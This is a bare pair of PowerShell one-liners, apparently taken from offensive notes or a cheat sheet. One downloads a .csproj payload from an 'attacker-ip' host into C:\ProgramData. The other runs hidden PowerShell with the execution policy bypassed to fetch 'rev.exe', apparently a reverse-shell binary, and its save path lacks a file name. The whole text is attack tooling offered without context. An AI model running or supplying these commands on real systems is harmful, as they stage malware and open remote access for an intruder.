powershell Invoke-WebRequest "http://attacker-ip:81/x41.csproj" -OutFile "C:\ProgramData\x41.csproj"

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://attacker-ip/rev.exe', 'C:\ProgramData\')"
